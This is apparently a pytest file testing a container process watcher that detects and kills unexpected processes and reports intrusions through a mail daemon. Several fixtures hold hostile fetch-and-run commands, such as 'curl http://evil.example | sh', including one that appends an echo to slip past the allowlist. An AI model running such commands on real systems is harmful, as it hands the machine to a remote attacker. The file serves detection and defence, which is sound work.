"""The watcher that finds a process the image does not start, and the channel
that tells somebody about it.

`backend/execguard.py` is the prevention and it cannot be raced; this is what
covers the processes that filter is not installed in -- the entrypoint shell,
supercronic, and supercronic's children in the mail role. So the subject here
is the rule for what belongs in a container, and the two things it does when
the rule breaks: report, then end the process.
"""

import os

import pytest

from backend import intrusion, paths, procwatch
from deploy import render_image_manifest

MINE = os.getpid()


def _watching(monkeypatch, pids, cmdlines):
    """A container holding exactly `pids`, with `cmdlines` describing them."""
    monkeypatch.setattr(procwatch, "live_pids", lambda: set(pids))
    monkeypatch.setattr(procwatch, "cmdline", lambda pid: cmdlines.get(pid))


def test_a_role_that_execs_its_interpreter_expects_exactly_itself(monkeypatch):
    """Four of the five entrypoint branches end in `exec python -m ...`, so the
    service is pid 1 and there is nothing else the container should hold."""
    for role in ("web", "hook", "egress", "ingress"):
        _watching(monkeypatch, [MINE], {})
        assert procwatch.check(role) is None


@pytest.mark.parametrize("role", ["web", "hook", "egress", "ingress"])
def test_any_second_process_is_refused(monkeypatch, role):
    _watching(monkeypatch, [MINE, 4242], {4242: ["/bin/sh"]})
    with pytest.raises(procwatch.IntrusionRefused) as refusal:
        procwatch.check(role)
    assert refusal.value.entries[0]["pid"] == 4242
    assert "/bin/sh" in refusal.value.entries[0]["cmdline"]


def test_a_process_this_uid_cannot_describe_is_still_reported(monkeypatch):
    """Unreadable is not absent, and it is the more interesting of the two: a
    process in this container that this account cannot name is a process
    running as somebody else."""
    _watching(monkeypatch, [MINE, 7], {})
    monkeypatch.setattr(procwatch.Path, "exists", lambda self: True)
    with pytest.raises(procwatch.IntrusionRefused) as refusal:
        procwatch.check("web")
    assert refusal.value.entries[0]["cmdline"] == "<unreadable>"


def test_the_mail_role_holds_its_scheduler_and_the_jobs_it_starts(monkeypatch):
    """The one container with a legitimately moving process set: flake.nix runs
    supercronic beside the daemon and supercronic runs each crontab line
    through a shell."""
    _watching(monkeypatch, [MINE, 1, 8, 40, 41], {
        1: ["/nix/store/abc-email-bot-entrypoint/bin/email-bot-entrypoint", "mail"],
        8: ["/nix/store/def-supercronic/bin/supercronic", "/app/crontab"],
        40: ["/bin/sh", "-c", "cd /app && python -m backend.drafting.email_summary"],
        41: ["python", "-m", "backend.drafting.email_summary"],
    })
    assert procwatch.check("mail") is None


def test_the_mail_role_refuses_a_shell_running_anything_else(monkeypatch):
    """The allowance is for the crontab, not for shells. A `sh -c` running
    something the schedule does not name is the thing being looked for."""
    _watching(monkeypatch, [MINE, 40], {
        40: ["/bin/sh", "-c", "curl http://evil.example | sh"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_a_command_that_merely_ends_in_a_scheduled_module_is_refused(monkeypatch):
    """The rule matches the crontab line whole. It used to match the end of it,
    which accepts any command at all as long as the attacker appends an echo --
    an allowlist whose vocabulary the attacker gets to finish."""
    _watching(monkeypatch, [MINE, 40], {
        40: ["/bin/sh", "-c",
             "curl http://evil.example | sh; echo backend.billing.billing_poller"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_a_binary_whose_path_merely_contains_the_entrypoint_name_is_refused(monkeypatch):
    """argv[0] is matched by basename off a path separator, not by substring:
    `/tmp/email-bot-entrypoint-payload` is not the entrypoint."""
    _watching(monkeypatch, [MINE, 40], {
        40: ["/tmp/email-bot-entrypoint-payload"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_supercronic_is_only_expected_against_the_image_crontab(monkeypatch):
    """It is allowed to run the schedule the image ships, not a file an
    attacker wrote."""
    _watching(monkeypatch, [MINE, 8], {
        8: ["/nix/store/def-supercronic/bin/supercronic", "/tmp/mine"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_a_second_copy_of_the_daemon_is_not_expected(monkeypatch):
    """The watcher runs inside the daemon, so the daemon is answered by its
    pid. Allowing its module name by name would allow a second one that nobody
    started."""
    _watching(monkeypatch, [MINE, 40], {
        40: ["python", "-m", "backend.daemons.daemon_loop"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_an_interpreter_running_an_unscheduled_module_is_refused(monkeypatch):
    _watching(monkeypatch, [MINE, 44], {
        44: ["python", "-m", "http.server"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_a_module_named_in_an_argument_does_not_pass(monkeypatch):
    """The module is read from the position after `-m`, so mentioning a
    scheduled name somewhere else in argv buys nothing."""
    _watching(monkeypatch, [MINE, 45], {
        45: ["python", "-c", "import os", "backend.billing.billing_poller"],
    })
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("mail")


def test_a_job_that_ended_mid_scan_is_only_forgiven_where_jobs_exist(monkeypatch):
    """A pid that vanished between the listing and the read is a race the mail
    role really has, three times a day. Nowhere else starts a process at all,
    so nowhere else gets the benefit of that doubt."""
    _watching(monkeypatch, [MINE, 99], {})
    monkeypatch.setattr(procwatch.Path, "exists", lambda self: False)
    assert procwatch.check("mail") is None
    with pytest.raises(procwatch.IntrusionRefused):
        procwatch.check("hook")


def test_the_watched_modules_are_the_ones_the_flake_starts():
    """Two files decide what runs in the mail container -- the crontab in
    flake.nix and the entrypoint's `case` -- and neither can read this one. A
    job added to the schedule and not here is a container that kills itself at
    05:00, which is why the union is asserted rather than trusted."""
    flake = (paths.REPO_ROOT / "flake.nix").read_text()
    crontab = flake.split("crontab = pkgs.writeText", 1)[1].split("'';", 1)[0]
    lines = [line.strip() for line in crontab.splitlines() if "python -m " in line]
    scheduled = {line.rsplit("python -m ", 1)[1].strip() for line in lines}
    assert scheduled == set(procwatch.SCHEDULED_MODULES), (
        "the crontab in flake.nix and SCHEDULED_MODULES disagree")

    # And the whole command, since that is what the shell rule matches. Five
    # leading fields of cron schedule, then the command supercronic runs.
    commands = {line.split(None, 5)[5] for line in lines}
    assert commands == set(procwatch.SCHEDULED_COMMANDS), (
        "SCHEDULED_COMMANDS is not what flake.nix's crontab actually runs: "
        f"{sorted(commands)}")

    roots = render_image_manifest.ROLE_ROOTS
    for role, module in procwatch.SERVICE_MODULES.items():
        assert module in roots[role], (
            f"{role} is watched for {module}, which is not one of its entry "
            f"points in render_image_manifest.ROLE_ROOTS")


def test_a_role_is_derived_from_the_module_that_was_started():
    """Entry points call `role_of(__spec__.name)` instead of naming their own
    role: watching one role's container against another's expected set is the
    difference between "one process" and "one process plus a scheduler"."""
    assert procwatch.role_of("frontend.web_server") == "web"
    assert procwatch.role_of("backend.daemons.daemon_loop") == "mail"
    with pytest.raises(AssertionError):
        procwatch.role_of("backend.drafting.email_summary")


def test_only_the_roles_that_mount_state_can_report():
    """`egress` and `ingress` mount no volume, so their report is the container
    exiting and looping. The reporter says so by being None rather than by
    failing to write at the moment it matters."""
    for role in intrusion.REPORTING_ROLES:
        assert intrusion.reporter(role) is not None
    for role in ("egress", "ingress"):
        assert intrusion.reporter(role) is None


def test_a_report_survives_to_the_role_that_can_send_it(monkeypatch, tmp_path):
    """The web tier finds something, writes it, and the mail daemon is what
    drains it: only that role holds a Telegram token, and putting one in the
    process facing the internet to alert about the process facing the internet
    would be the trade this split exists to refuse."""
    monkeypatch.setattr(paths, "RUN_DIR", tmp_path)
    intrusion.reporter("web")({"pid": 4242, "cmdline": "/bin/sh"})
    drained = intrusion.drain()
    assert len(drained) == 1
    assert drained[0]["role"] == "web"
    assert drained[0]["pid"] == 4242
    assert "4242" in intrusion.summarize(drained)
    assert intrusion.drain() == []


def test_a_report_that_cannot_be_written_does_not_stop_the_exit(monkeypatch, tmp_path):
    """The process writing one has already found something it cannot explain
    about itself, so the write may be into a filesystem an attacker controls.
    It must not be what the exit waits on.

    The unwritable path is a directory under a regular file, which fails in the
    mkdir rather than in the open: a path that merely does not exist yet is one
    `ensure_run_dir` creates, so it would have tested the opposite."""
    blocked = tmp_path / "not-a-directory"
    blocked.write_text("")
    monkeypatch.setattr(paths, "RUN_DIR", blocked / "state")
    intrusion.reporter("web")({"pid": 1, "cmdline": "x"})


def test_the_refusal_ends_the_process_rather_than_the_thread(monkeypatch):
    """`os._exit`, not `sys.exit`: this runs on a thread, where `SystemExit`
    ends the thread and leaves the compromised process serving."""
    ended = {}
    monkeypatch.setattr(os, "_exit", lambda code: ended.setdefault("code", code))
    sent = []
    err = procwatch.IntrusionRefused("found", [{"pid": 9, "cmdline": "sh"}])
    procwatch._refuse("web", err, sent.append)
    assert ended["code"] == procwatch.EXIT_INTRUSION
    assert sent == [{"pid": 9, "cmdline": "sh"}]
